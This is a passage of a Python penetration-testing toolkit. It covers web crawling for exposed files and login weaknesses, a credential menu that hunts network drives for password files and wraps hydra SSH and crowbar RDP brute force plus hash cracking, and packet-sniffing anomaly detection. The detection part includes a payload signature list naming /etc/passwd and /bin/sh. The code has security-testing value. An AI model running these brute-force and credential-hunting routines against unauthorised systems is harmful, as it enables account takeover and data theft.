        method = form.get("method", "GET").upper()
        inputs = [input_tag.get("name", "Unnamed") for input_tag in form.find_all("input")]
        csrf_present = any("csrf" in input.lower() for input in inputs)
        
        discovered_forms.append({
            "URL": url,
            "Action": action,
            "Method": method,
            "Fields": ", ".join(inputs),
            "CSRF Token": "✅ Present" if csrf_present else "❌ Missing"
        })

def check_exposed_files(url):
    """Check for potentially exposed sensitive files."""
    sensitive_files = ["wp-config.php", ".git", "config.php", "db_backup.sql", "admin.php"]
    for file in sensitive_files:
        full_url = urljoin(url, file)
        try:
            response = session.head(full_url, timeout=5)
            if response.status_code == 200:
                exposed_files.append({"URL": full_url, "Status": "⚠️ Exposed"})
        except requests.exceptions.RequestException:
            pass

def crawl(url, max_depth=2, depth=0):
    """Crawl a website and extract forms & exposed files."""
    if depth > max_depth or url in visited_urls:
        return
    visited_urls.add(url)

    print(f"🔍 Crawling: {url}")
    html = fetch_page(url)
    if not html:
        return
    
    soup = BeautifulSoup(html, "html.parser")
    extract_forms(url, soup)
    check_exposed_files(url)

    # Find new links to crawl
    for link in soup.find_all("a", href=True):
        next_url = urljoin(url, link["href"])
        if next_url.startswith(url):
            crawl(next_url, max_depth, depth + 1)

def save_results():
    """Save results to a CSV file."""
    with open("web_crawl_results.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["URL", "Action", "Method", "Fields", "CSRF Token"])
        writer.writeheader()
        writer.writerows(discovered_forms)

    with open("exposed_files.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["URL", "Status"])
        writer.writeheader()
        writer.writerows(exposed_files)

    print("\n📁  Results saved to: web_crawl_results.csv & exposed_files.csv")

def check_security_headers(url):
    """Check for misconfigured or missing security headers."""
    print(f"\n🔍 Checking security headers for: {url}")

    try:
        response = session.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        headers = response.headers

        security_headers = {
            "Strict-Transport-Security": "HSTS Missing (Consider adding)",
            "Content-Security-Policy": "CSP Missing (Mitigate XSS risks)",
            "X-Frame-Options": "Clickjacking Protection Missing",
            "X-Content-Type-Options": "MIME Sniffing Protection Missing",
            "Referrer-Policy": "Consider setting to 'strict-origin' or 'no-referrer'",
        }

        results = []
        for header, message in security_headers.items():
            if header not in headers:
                results.append({"Header": header, "Status": "❌ Missing", "Recommendation": message})
            else:
                results.append({"Header": header, "Status": "✅ Present", "Recommendation": "Good"})

        print("\n🔒  Security Header Analysis:")
        print(tabulate(results, headers="keys", tablefmt="fancy_grid"))

        # Save to CSV
        with open("security_headers.csv", "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["Header", "Status", "Recommendation"])
            writer.writeheader()
            writer.writerows(results)

        print("\n📁  Security header results saved to: security_headers.csv")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error fetching headers: {e}")
 
def test_login_form(url, username_field="username", password_field="password"):
    """Test for weak login security without damaging the database."""
    print(f"\n🔐  Testing login security on: {url}")

    # Fetch the page to extract form details
    html = fetch_page(url)
    if not html:
        return

    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        print("❌  No login form detected.")
        return

    action = form.get("action", url)  # Use form action if specified, otherwise use the page itself
    method = form.get("method", "GET").upper()
    inputs = {input_tag.get("name"): "test" for input_tag in form.find_all("input")}

    if username_field not in inputs or password_field not in inputs:
        print("⚠️  Could not auto-detect username/password fields. Try manually specifying them.")
        return

    inputs[username_field] = "testuser"
    inputs[password_field] = "Password123"  # Common weak password test

    login_url = urljoin(url, action)

    try:
        response = session.post(login_url, data=inputs, timeout=10, allow_redirects=False)

        if response.status_code == 302:
            print("✅ Possible Login Success (Check for Weak Password Policy)")
        elif response.status_code == 200:
            print("🔍 Login Response Received (Possible Failed Login)")
        else:
            print(f"⚠️  Unexpected response: {response.status_code}")

        # Check if login over HTTP
        if not login_url.startswith("https"):
            print("⚠️  WARNING: Login is over **HTTP**, credentials may be exposed!")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error testing login form: {e}")

def detect_username_enumeration(url, username_field="username", password_field="password"):
    """Detect username enumeration vulnerabilities in login forms."""
    print(f"\n🔍 Testing for Username Enumeration on: {url}")

    html = fetch_page(url)
    if not html:
        return

    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        print("❌ No login form detected.")
        return

    action = form.get("action", url)
    method = form.get("method", "GET").upper()
    inputs = {input_tag.get("name"): "test" for input_tag in form.find_all("input")}

    if username_field not in inputs or password_field not in inputs:
        print("⚠️  Could not auto-detect username/password fields. Try manually specifying them.")
        return

    login_url = urljoin(url, action)

    test_users = {
        "valid_user": "admin",
        "invalid_user": "randomuser123456"
    }

    responses = {}

    for label, test_user in test_users.items():
        inputs[username_field] = test_user
        inputs[password_field] = "WrongPassword123"
        
        try:
            response = session.post(login_url, data=inputs, timeout=10)
            responses[label] = response.text
            print(f"✅ Attempted login with {label}: {test_user}")
        except requests.exceptions.RequestException as e:
            print(f"❌ Error testing {label}: {e}")
            return

    # Compare responses
    if responses["valid_user"] != responses["invalid_user"]:
        print("\n⚠️  **Potential Username Enumeration Detected!**")
        print("   - Different responses for valid vs. invalid usernames.")
    else:
        print("\n✅ No username enumeration detected.")

def test_session_management(url, username_field="username", password_field="password"):
    """Test for session security issues like weak session tokens and fixation."""
    print(f"\n🔍 Testing Session Management on: {url}")

    html = fetch_page(url)
    if not html:
        return

    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        print("❌ No login form detected.")
        return

    action = form.get("action", url)
    login_url = urljoin(url, action)

    # Step 1: Fetch session cookie before login
    pre_login_response = session.get(url, timeout=10)
    pre_login_cookie = session.cookies.get_dict()

    # Step 2: Perform login
    inputs = {input_tag.get("name"): "test" for input_tag in form.find_all("input")}
    inputs[username_field] = "admin"  # Assume admin exists
    inputs[password_field] = "TestPassword123"

    try:
        login_response = session.post(login_url, data=inputs, timeout=10)
        post_login_cookie = session.cookies.get_dict()
    except requests.exceptions.RequestException as e:
        print(f"❌ Error testing login session: {e}")
        return

    # Step 3: Fetch session cookie after login
    if pre_login_cookie == post_login_cookie:
        print("\n⚠️  **Potential Session Fixation Issue!**")
        print("   - Session ID did not change after login.")
    else:
        print("\n✅ Session ID changed after login (Good Practice).")

    # Step 4: Logout and check if session is destroyed
    logout_url = urljoin(url, "/logout")  # Common logout endpoint
    session.get(logout_url, timeout=10)
    post_logout_cookie = session.cookies.get_dict()

    if post_logout_cookie == post_login_cookie:
        print("\n⚠️  **Potential Session Persistence Issue!**")
        print("   - Session remains active after logout.")
    else:
        print("\n✅ Session is properly invalidated on logout.")

def web_crawler():
    """Main execution function."""
    target_url = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    max_depth = int(safe_input("Enter max crawl depth (default: 2): ") or 2)
    
    print(f"\n🕷️  Starting web crawl on: {target_url}\n")
    crawl(target_url, max_depth)

    # Display summary in tabulated format
    if discovered_forms:
        print("\n📝  Forms Found:")
        print(tabulate(discovered_forms, headers="keys", tablefmt="fancy_grid"))
    
    if exposed_files:
        print("\n⚠️  Exposed Sensitive Files:")
        print(tabulate(exposed_files, headers="keys", tablefmt="fancy_grid"))

    save_results()

###########################################################################
#                                                                         #
#                       CREDENTIAL AUDITING MENU                          #
#                                                                         #
###########################################################################

def credential_auditing_menu():
    """Credential Auditing & Brute Force Menu"""
    while True:
        clear_screen()
        print("\n🔑 Credential Auditing & Brute Force (Linux Only)")
        print("1  Scan Network Drives for Password Files")
        print("2  Audit Weak SSH Credentials (hydra)")
        print("3  Test RDP Brute Force (Crowbar)")
        print("4  Crack Hashes (John the Ripper / Hashcat)")
        print("5  Audit Common Windows Passwords (NTHashes)")
        print("6  Back to Advanced Security Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            scan_mapped_drives()
        elif choice == "2":
            brute_force_ssh()
        elif choice == "3":
            brute_force_rdp()
        elif choice == "4":
            hash_cracking()
        elif choice == "5":
            audit_nt_hashes()
        elif choice == "6":
            return  # Go back
        else:
            print("❌ Invalid choice. Try again.")

# Define password-related filenames to search for
PASSWORD_FILES = {
    "passwords.txt", "creds.txt", "logins.txt", "secrets.txt",
    "credentials.csv", "logins.csv", "passwords.docx", "key.txt"
}

def get_mapped_drives():
    """Retrieve mapped network drives from 'net use' and include hidden shares."""
    try:
        result = subprocess.run(["net", "use"], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        mapped_drives = []

        for line in lines:
            parts = line.split()
            if len(parts) >= 2 and parts[1].startswith("\\\\"):
                mapped_drives.append(parts[1])  # Extract UNC path (e.g., \\towerad.local\data)

        return mapped_drives
    except Exception as e:
        print(f"❌ Error retrieving mapped drives: {e}")
        return []

def search_for_password_files(root_path):
    """Recursively search for password-related files in UNC paths."""
    found_files = []
    try:
        for dirpath, _, filenames in os.walk(root_path):
            for filename in filenames:
                if filename.lower() in PASSWORD_FILES:
                    file_path = os.path.join(dirpath, filename)
                    found_files.append([root_path, file_path])
    except PermissionError:
        print(f"⚠️ Permission Denied: {root_path}")
    except FileNotFoundError:
        print(f"⚠️ Drive Not Found: {root_path}")

    return found_files

def scan_mapped_drives():
    """Scan all mapped network drives for sensitive password files, including hidden shares."""
    mapped_drives = get_mapped_drives()

    if not mapped_drives:
        print("⚠️ No mapped network drives found.")
        return

    print("\n🔍 Scanning Mapped Drives for Password Files...\n")
    all_found_files = []

    for drive in mapped_drives:
        print(f"📂 Searching in: {drive}...")

        found_files = search_for_password_files(drive)
        if found_files:
            all_found_files.extend(found_files)
            print(f"✅ Found {len(found_files)} potential password files in {drive}!\n")
        else:
            print(f"❌ No password files found in {drive}.\n")

    # Display results in tabulated format
    if all_found_files:
        print("\n📊 **Password Files Found:**\n")
        headers = ["Mapped Drive", "File Path"]
        print(tabulate(all_found_files, headers=headers, tablefmt="fancy_grid"))

        # Save results to CSV
        csv_filename = "password_file_results.csv"
        with open(csv_filename, "w", newline="", encoding="utf-8") as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(headers)
            writer.writerows(all_found_files)
        
        print(f"\n✅ Scan complete! Results saved to: {csv_filename}")
    else:
        print("\n✅ Scan complete! No password files found.")

def brute_force_ssh():
    """Brute-force SSH login using Hydra"""
    target = safe_input("Enter target IP or domain: ").strip()
    userlist = safe_input("Enter path to username list (default: rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    passlist = safe_input("Enter path to password list (default: rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"

    log_file = f"ssh_bruteforce_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    print(f"\n🔓 Running SSH brute-force attack on {target}...\n")

    command = ["hydra", "-L", userlist, "-P", passlist, "ssh://"+target, "-o", log_file]
    execute_command(command, log_file)

def brute_force_rdp():
    """Brute-force RDP logins using Crowbar"""
    target = safe_input("Enter target IP: ").strip()
    userlist = safe_input("Enter path to username list: ").strip()
    passlist = safe_input("Enter path to password list: ").strip()

    log_file = f"rdp_bruteforce_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    print(f"\n🔓 Running RDP brute-force attack on {target}...\n")

    command = ["crowbar", "-b", "rdp", "-s", target, "-U", userlist, "-C", passlist, "-o", log_file]
    execute_command(command, log_file)

def hash_cracking():
    """Crack password hashes using John the Ripper or Hashcat"""
    hash_file = safe_input("Enter path to hash file: ").strip()
    mode = safe_input("Choose tool (1: John the Ripper, 2: Hashcat): ").strip()

    if mode == "1":
        print("\n🔑 Running John the Ripper...")
        command = ["john", "--wordlist=/usr/share/wordlists/rockyou.txt", hash_file]
    elif mode == "2":
        hash_mode = safe_input("Enter Hashcat mode (e.g., 1000 for NTLM, 0 for MD5): ").strip()
        print("\n🔑 Running Hashcat...")
        command = ["hashcat", "-m", hash_mode, "-a", "0", hash_file, "/usr/share/wordlists/rockyou.txt"]
    else:
        print("❌ Invalid option.")
        return

    execute_command(command, "hash_crack_results.txt")

def audit_nt_hashes():
    """Audit common Windows passwords using NT hashes"""
    hash_file = safe_input("Enter path to NT hashes file: ").strip()
    passlist = safe_input("Enter path to password list (default: rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"

    print("\n🔍 Checking NT hashes against weak password list...")
    command = ["john", "--format=NT", "--wordlist=" + passlist, hash_file]

    execute_command(command, "nt_hash_audit_results.txt")

###########################################################################
#                                                                         #
#                       TRAFFIC ANALYSIS MENU                             #
#                                                                         #
###########################################################################

def traffic_analysis_menu():
    """Traffic Analysis & Packet Sniffing Menu"""
    global captured_packets  # ✅ Ensure the packet list is used across functions
    
    while True:
        clear_screen()
        print("\n🌐 Traffic Analysis & Packet Sniffing")
        print("1  Live Packet Capture")
        print("2  Filter Network Traffic (e.g., HTTP, DNS, ICMP)")
        print("3  Detect Anomalous Traffic (e.g., Port Scanning, Suspicious IPs)")
        print("4  Export Captured Packets (PCAP, CSV, JSON)")
        print("5  Inspect Packets for Malicious Signatures")
        print("6  Network Bandwidth Usage Monitoring")
        print("7  Back to Advanced Security Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            captured_packets = sniff_packets()
            safe_input("")
        elif choice == "2":
            filter_network_traffic()
        elif choice == "3":
            detect_anomalous_traffic()
        elif choice == "4":
            export_captured_packets()
            safe_input("Press enter...")
        elif choice == "5":
            inspect_malicious_signatures()
        elif choice == "6":
            monitor_bandwidth_usage()
        elif choice == "7":
            return  # Go back
        else:
            print("❌ Invalid choice. Try again.")

captured_packets = []
suspicious_domains = ["malicious.com", "phishing.com"]
alert_threshold = 500  # UDP packet size threshold for potential DDoS/exfiltration

def list_interfaces():
    """List available network interfaces and return them as a list."""
    from scapy.arch.windows import get_windows_if_list
    interfaces = get_windows_if_list()

    if not interfaces:
        print("❌ No network interfaces found. Please check your setup.")
        return []

    interface_names = [iface["name"] for iface in interfaces]  # ✅ Extract only names

    print("\n🌐 Available Network Interfaces:")
    for i, iface in enumerate(interface_names, 1):
        print(f"{i}. {iface}")

    return interface_names  # ✅ Return correct interface names

def detect_suspicious_traffic(pkt):
    """Analyzes captured packets for suspicious activity."""

    # ARP Spoofing Detection
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:  # Who-has request
        print(f"⚠️ ARP Request Detected: {pkt[ARP].psrc} asking about {pkt[ARP].pdst}")

    # DNS Suspicious Domain Lookup
    elif pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        domain = pkt[DNSQR].qname.decode()
        if any(bad_domain in domain for bad_domain in suspicious_domains):
            print(f"🚨 Suspicious DNS Query: {domain} from {pkt[IP].src}")

    # UDP Traffic Analysis (Prevent `NoneType` errors)
    elif pkt.haslayer(UDP):
        size = len(pkt[UDP]) if pkt[UDP] is not None else 0
        if size > alert_threshold:
            print(f"🚨 Large UDP Traffic Detected: {pkt[IP].src} -> {pkt[IP].dst} ({size} bytes)")

    # TCP Unusual Port Activity (Prevent `NoneType` errors)
    elif pkt.haslayer(TCP) and pkt[TCP].dport:
        dport = pkt[TCP].dport if pkt[TCP].dport is not None else -1  # Default to -1 if None
        if dport not in [80, 443, 22, 21]:  # Flag non-standard ports
            print(f"⚠️ Unusual Port Activity: {pkt[IP].src} -> {pkt[IP].dst} Port {dport}")

def packet_callback(packet):
    """Process each captured packet and check for suspicious behavior."""
    captured_packets.append(packet)
    detect_suspicious_traffic(packet)  # Run threat detection
    print(f"📦 {packet.summary()}")

def sniff_packets():
    """Capture live packets and store them globally."""
    global captured_packets
    captured_packets.clear()  # ✅ Reset captured packet list

    interfaces = list_interfaces()  # ✅ Get available interfaces

    if not interfaces:
        print("❌ No network interfaces found. Please check your setup.")
        return

    iface_choice = safe_input("\n🛠 Select network interface (number or name): ").strip()

    # ✅ Ensure valid interface selection
    try:
        interface = interfaces[int(iface_choice) - 1] if iface_choice.isdigit() else iface_choice
    except (IndexError, ValueError):
        print("❌ Invalid selection. Please enter a valid number or interface name.")
        safe_input("\n🔄 Press Enter to return to the menu...")
        return

    # ✅ Validate interface exists in `psutil`
    if interface not in psutil.net_io_counters(pernic=True):
        print(f"❌ Error: Interface '{interface}' not found. Please check and try again.")
        safe_input("\n🔄 Press Enter to return to the menu...")
        return

    # ✅ Allow user to set capture parameters
    packet_count = safe_input("📊 Enter number of packets to capture (default: unlimited): ").strip()
    packet_count = int(packet_count) if packet_count.isdigit() else 0  # 0 means unlimited

    timeout = safe_input("⏳ Enter capture duration in seconds (default: 10): ").strip()
    timeout = int(timeout) if timeout.isdigit() else 10  # Default: 10s

    filter_choice = safe_input("🎯 Enter packet filter (e.g., 'tcp port 80', 'icmp', press Enter for all): ").strip()

    print(f"\n🚀 Capturing packets on {interface} for {timeout} seconds or {packet_count} packets... Press CTRL+C to stop.")

    try:
        captured_packets = sniff(
            iface=interface,
            count=packet_count,
            timeout=timeout,
            filter=filter_choice if filter_choice else None,
            prn=lambda pkt: print(f"📦 {pkt.summary()}")
        )
    except Exception as e:
        print(f"❌ Error capturing packets: {e}")

    print(f"\n✅ Capture complete. {len(captured_packets)} packets stored.")
    safe_input("\n🔄 Press Enter to return to the menu...")

    return captured_packets  # ✅ Ensures packets are stored globally

def live_packet_capture():
    """Main function for live packet capture with filtering and detection."""
    print("\n🔍 Starting Live Packet Capture... (Press CTRL+C to stop)")

    if os.name == "nt":
        interfaces = list_interfaces()
    else:
        from scapy.arch import get_if_list
        interfaces = get_if_list()

    iface_choice = safe_input("\n🛠 Select an interface (number or name): ").strip()
    iface = interfaces[int(iface_choice) - 1] if iface_choice.isdigit() else iface_choice

    # Default filter options
    filter_options = {
        "1": "tcp port 80 or tcp port 443",  # HTTP/HTTPS
        "2": "udp port 53",  # DNS
        "3": "arp",  # ARP Requests
        "4": "icmp",  # Ping (ICMP)
        "5": "port not 5353 and not broadcast and not multicast"  # General Cleanup
    }

    print("\n🔹 Select a filter:")
    for key, value in filter_options.items():
        print(f"{key}. {value}")

    filter_choice = safe_input("\n🎯 Choose a filter (or press Enter for no filter): ").strip()
    capture_filter = filter_options.get(filter_choice, "")

    packet_count = safe_input("📊 Enter number of packets to capture (default: unlimited): ").strip()
    packet_count = int(packet_count) if packet_count.isdigit() else None

    timeout = safe_input("⏳ Enter capture duration in seconds (default: 10): ").strip()
    timeout = int(timeout) if timeout.isdigit() else 10  # Default timeout: 10s

    save_file = safe_input("💾 Save capture to file? (y/n): ").strip().lower()
    pcap_filename = f"capture_{iface}.pcap" if save_file == "y" else None

    capture_thread = threading.Thread(target=sniff_packets, args=(iface, packet_count, timeout, capture_filter))
    capture_thread.start()

    # Allow user to exit gracefully
    try:
        while capture_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🚪 Capture stopped by user.")
        capture_thread.join()

    if pcap_filename:
        wrpcap(pcap_filename, captured_packets)
        print(f"\n✅ Capture saved to: {pcap_filename}")

def clear_screen():
    """Clear screen for better UI."""
    os.system("cls" if os.name == "nt" else "clear")

def filter_network_traffic():
    """Filter captured network traffic based on protocol selection with logging."""
    
    print("\n🎯 Filter Network Traffic")
    print("1  HTTP Traffic")
    print("2  DNS Queries")
    print("3  ICMP (Ping Requests)")
    print("4  ARP (Address Resolution Protocol)")
    print("5  Custom Filter (e.g., port 443, src 192.168.1.1)")
    print("6  Back to Traffic Analysis Menu")

    choice = safe_input("\nSelect an option: ").strip()
    clear_screen()  # Clear screen after selection

    filter_options = {
        "1": "tcp port 80 or tcp port 443",  # HTTP (port 80), HTTPS (port 443)
        "2": "udp port 53",  # DNS queries
        "3": "icmp",  # ICMP traffic (pings)
        "4": "arp",  # ARP requests/responses
        "5": None  # Custom filter
    }

    if choice == "6":
        return  # Back to menu

    if choice == "5":
        custom_filter = safe_input("Enter a custom filter (e.g., 'port 443' or 'src 192.168.1.1'): ").strip()
        if not custom_filter:
            print("❌ Invalid filter. Returning to menu.")
            return
        filter_expr = custom_filter
    else:
        filter_expr = filter_options.get(choice)

    if filter_expr:
        print(f"\n🚀 Capturing packets matching filter: {filter_expr}... Press CTRL+C to stop.\n")
        
        captured_packets = []
        try:
            captured_packets = sniff(filter=filter_expr, prn=lambda pkt: print(f"📦 {pkt.summary()}"), store=True)
        except KeyboardInterrupt:
            print("\n🚪 Capture stopped.")

        if captured_packets:
            save_file = safe_input("\n💾 Save capture to file? (y/n): ").strip().lower()
            if save_file == "y":
                filename = f"filtered_traffic_{filter_expr.replace(' ', '_').replace(':', '_')}.pcap"
                wrpcap(filename, captured_packets)
                print(f"\n✅ Capture saved to: {filename}")

    else:
        print("❌ Invalid choice. Returning to menu.")

# Store detected anomalies
anomalies = []
anomaly_file = f"anomaly_report_{int(time.time())}.txt"
ip_activity = defaultdict(int)  # Track high-frequency connections
syn_packets = defaultdict(int)  # Track SYN packets per IP
dns_requests = defaultdict(int)  # Track DNS request frequency
exfiltration_data = defaultdict(int)  # Track large outbound data transfers

# Define suspicious port ranges
COMMON_PORTS = {80, 443, 53, 22, 25, 3389, 445}
HIGH_PORT_THRESHOLD = 10000  # Ports above this are considered high-numbered

# SYN Flood Threshold (e.g., 100 SYN packets in 5 seconds)
SYN_FLOOD_THRESHOLD = 100
SYN_RESET_TIME = 5  # Seconds

# DNS Tunneling Threshold (Unusually high DNS requests from one source)
DNS_TUNNEL_THRESHOLD = 50

# Data Exfiltration Threshold (Packets over 5MB are suspicious)
EXFIL_SIZE_THRESHOLD = 5000000  # 5MB

def detect_anomalies(packet):
    """Analyze packets and detect suspicious activity."""
    global anomalies

    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        # Track connection attempts per IP
        ip_activity[src_ip] += 1
        if ip_activity[src_ip] > 50:  # More than 50 packets from same IP in short time
            anomaly = f"⚠️ High Traffic Volume: {src_ip} sent {ip_activity[src_ip]} packets"
            print(anomaly)
            anomalies.append(anomaly)

        # Detect TCP anomalies
        if TCP in packet:
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport

            # SYN Flood Detection
            if packet[TCP].flags == "S":
                syn_packets[src_ip] += 1
                if syn_packets[src_ip] > SYN_FLOOD_THRESHOLD:
                    anomaly = f"🚨 SYN Flood Detected! {src_ip} -> {dst_ip} (SYN Count: {syn_packets[src_ip]})"
                    print(anomaly)
                    anomalies.append(anomaly)

            # Unusual port usage
            if dst_port not in COMMON_PORTS and dst_port > HIGH_PORT_THRESHOLD:
                anomaly = f"⚠️ Unusual Port Activity: {src_ip} -> {dst_ip} Port {dst_port}"
                print(anomaly)
                anomalies.append(anomaly)

        # Detect UDP anomalies
        if UDP in packet:
            src_port = packet[UDP].sport
            dst_port = packet[UDP].dport

            if dst_port not in COMMON_PORTS and dst_port > HIGH_PORT_THRESHOLD:
                anomaly = f"⚠️ Unusual UDP Traffic: {src_ip} -> {dst_ip} Port {dst_port}"
                print(anomaly)
                anomalies.append(anomaly)

        # Detect ICMP anomalies (possible scanning)
        if ICMP in packet:
            anomaly = f"⚠️ ICMP Ping Flood? {src_ip} -> {dst_ip}"
            print(anomaly)
            anomalies.append(anomaly)

        # Detect DNS Tunneling
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # QR=0 means a DNS query
            dns_requests[src_ip] += 1
            if dns_requests[src_ip] > DNS_TUNNEL_THRESHOLD:
                anomaly = f"🚨 Possible DNS Tunneling: {src_ip} made {dns_requests[src_ip]} DNS requests"
                print(anomaly)
                anomalies.append(anomaly)

        # Detect Data Exfiltration (Large Data Transfer)
        if packet.haslayer(Raw):
            data_size = len(packet[Raw].load)
            if data_size > EXFIL_SIZE_THRESHOLD:
                anomaly = f"🚨 Possible Data Exfiltration: {src_ip} -> {dst_ip} Sent {data_size / 1000000:.2f} MB"
                print(anomaly)
                anomalies.append(anomaly)

def analyze_pcap(filename):
    """Load a PCAP file and analyze its packets for anomalies."""
    print(f"\n📂 Loading PCAP File: {filename}")

    try:
        packets = rdpcap(filename)
        print(f"📊 Total Packets in File: {len(packets)}")
        for packet in packets:
            detect_anomalies(packet)
    except Exception as e:
        print(f"❌ Error loading PCAP: {e}")

def save_anomalies():
    """Save anomalies to a file before clearing the screen."""
    if anomalies:
        try:
            with open(anomaly_file, "w", encoding="utf-8") as f:  # Force UTF-8 encoding
                for anomaly in anomalies:
                    f.write(anomaly + "\n")
            print(f"\n✅ Anomalies saved to: {anomaly_file}")
        except Exception as e:
            print(f"❌ Failed to save anomalies: {e}")

def detect_anomalous_traffic():
    """Main function allowing user to choose between live or PCAP analysis."""
    print("\n🔍 Traffic Anomaly Detection")
    print("1. Live Packet Capture & Analysis")
    print("2. Analyze Existing PCAP File")
    choice = safe_input("\n🛠 Select an option (1/2): ").strip()

    if choice == "1":
        sniff_packets()
    elif choice == "2":
        pcap_file = safe_input("\n📂 Enter the PCAP filename (with extension): ").strip()
        if os.path.exists(pcap_file):
            analyze_pcap(pcap_file)
        else:
            print(f"❌ File not found: {pcap_file}")
    else:
        print("❌ Invalid selection.")

    # Ensure anomalies are saved before clearing screen
    save_anomalies()

    # Prevent immediate screen clear, allowing user to review results
    safe_input("\n🔍 Press Enter to return to the main menu...")

def export_captured_packets():
    """Allow user to export captured packets in PCAP, CSV, or JSON format."""
    global captured_packets
    if not captured_packets:
        print("❌ No packets available to export.")
        return

    print("\n📁 Export Captured Packets")
    print("1. Save as PCAP")
    print("2. Save as CSV")
    print("3. Save as JSON")

    choice = safe_input("🛠 Select an export format (1/2/3): ").strip()
    filename = safe_input("💾 Enter filename (without extension): ").strip()

    if not filename:
        filename = "captured_packets"

    if choice == "1":
        filename += ".pcap"
        wrpcap(filename, captured_packets)
        print(f"✅ Packets saved as PCAP: {filename}")

    elif choice == "2":
        filename += ".csv"
        with open(filename, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Time", "Source", "Destination", "Protocol", "Summary"])
            
            for pkt in captured_packets:
                writer.writerow([
                    pkt.time, 
                    pkt[IP].src if pkt.haslayer(IP) else "N/A", 
                    pkt[IP].dst if pkt.haslayer(IP) else "N/A", 
                    pkt.sprintf("%IP.proto%") if pkt.haslayer(IP) else "N/A",
                    pkt.summary()
                ])
        print(f"✅ Packets saved as CSV: {filename}")

    elif choice == "3":
        filename += ".json"
        packet_data = []
        
        for pkt in captured_packets:
            packet_info = {
                "time": pkt.time,
                "source": pkt[IP].src if pkt.haslayer(IP) else "N/A",
                "destination": pkt[IP].dst if pkt.haslayer(IP) else "N/A",
                "protocol": pkt.sprintf("%IP.proto%") if pkt.haslayer(IP) else "N/A",
                "summary": pkt.summary()
            }
            packet_data.append(packet_info)

        with open(filename, "w", encoding="utf-8") as f:
            json.dump(packet_data, f, indent=4)

        print(f"✅ Packets saved as JSON: {filename}")

    else:
        print("❌ Invalid selection.")

def inspect_malicious_signatures():
    """Main function to inspect packets for malicious signatures."""
    print("\n🔍 Inspecting Packets for Malicious Signatures")
    print("1. Analyze Live Packet Capture")
    print("2. Analyze Existing PCAP File")
    choice = safe_input("\n🛠 Select an option (1/2): ").strip()

    if choice == "1":
        captured_packets = sniff_packets()
        analyze_packets(captured_packets)
    elif choice == "2":
        pcap_file = safe_input("\n📂 Enter the PCAP filename (with extension): ").strip()
        if os.path.exists(pcap_file):
            packets = rdpcap(pcap_file)
            analyze_packets(packets)
        else:
            print(f"❌ File not found: {pcap_file}")
    else:
        print("❌ Invalid selection.")

def analyze_packets(packets):
    """Analyze packets for malicious patterns."""
    global malicious_packets
    malicious_packets = []

    for pkt in packets:
        if is_malicious(pkt):
            malicious_packets.append(pkt)
            print(f"🚨 Malicious Packet Detected: {pkt.summary()}")
    
    if malicious_packets:
        save_results(malicious_packets)
    else:
        print("✅ No malicious packets detected.")

    safe_input("Press enter to continue...")

def is_malicious(packet):
    """Check if a packet contains known malicious signatures."""
    known_bad_ips = {"192.168.1.100", "10.0.0.200"}  # Example
    known_bad_domains = {"malware-site.com", "phishing-site.net"}
    known_payloads = [b"/etc/passwd", b"cmd.exe", b"powershell", b"/bin/sh"]

    if packet.haslayer(IP):
        if packet[IP].src in known_bad_ips or packet[IP].dst in known_bad_ips:
            return True

    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        queried_domain = packet[DNSQR].qname.decode()
        if any(bad_domain in queried_domain for bad_domain in known_bad_domains):
            return True
    
    if packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
        if any(mal_payload in payload for mal_payload in known_payloads):
            return True
    
    return False

def save_results(malicious_packets):
    """Save detected malicious packets to a file."""
    filename = "malicious_packets.pcap"
    wrpcap(filename, malicious_packets)
    print(f"\n✅ Malicious packets saved to: {filename}")

    csv_filename = "malicious_packets.csv"
    with open(csv_filename, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Source", "Destination", "Protocol", "Summary"])
        for pkt in malicious_packets:
            writer.writerow([
                pkt[IP].src if pkt.haslayer(IP) else "N/A",
                pkt[IP].dst if pkt.haslayer(IP) else "N/A",
                pkt.sprintf("%IP.proto%") if pkt.haslayer(IP) else "N/A",
                pkt.summary()
            ])
    print(f"✅ Malicious packet details saved to CSV: {csv_filename}")
    safe_input("Press enter to continue...")

def monitor_bandwidth_usage():
    """Monitor real-time network bandwidth usage per interface."""
    
    interfaces = list_interfaces()  # ✅ Ensure we get a list of interfaces

    if not interfaces:
        print("❌ No network interfaces found. Please check your setup.")
        return

    iface_choice = safe_input("\n🛠 Select network interface to monitor (number or name): ").strip()

    # ✅ Ensure valid interface selection
    try:
        interface = interfaces[int(iface_choice) - 1] if iface_choice.isdigit() else iface_choice
    except (IndexError, ValueError):
        print("❌ Invalid selection. Please enter a valid number or interface name.")
        safe_input("\n🔄 Press Enter to return to the menu...")
        return

    # ✅ Check if interface exists in psutil
    if interface not in psutil.net_io_counters(pernic=True):
        print(f"❌ Error: Interface '{interface}' not found. Please check and try again.")
